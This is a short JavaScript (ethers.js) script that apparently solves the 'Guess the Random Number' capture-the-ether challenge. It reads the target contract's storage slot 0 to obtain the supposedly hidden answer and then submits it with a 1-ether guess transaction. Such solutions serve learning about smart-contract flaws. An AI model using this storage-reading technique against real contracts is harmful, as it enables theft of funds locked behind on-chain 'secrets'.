
const { utils, Contract, BigNumber } = require('ethers');

var { wallet, provider } = require('./common')

const contractAddress = '0x6884Bc5d044A643056d14c0A9dD93c1219174ac6';

async function main() {
	utils.formatBytes32String('aaron');
	const iface = new utils.Interface([
		'function guess(uint8 n) payable',
	]);

	var contract = new Contract(contractAddress, iface, provider);
	let contractWithSigner = contract.connect(wallet);
	const options = { value: utils.parseEther("1.0") }

	// contract GuessTheRandomNumberChallenge {
	// uint8 answer;
	var number = await provider.getStorageAt(contractAddress, 0);

	var number = BigNumber.from(number).toNumber();

	let tx = await contractWithSigner.guess(number, options);

	var result = await tx.wait();
	console.log(result);
}


main().catch(console.error);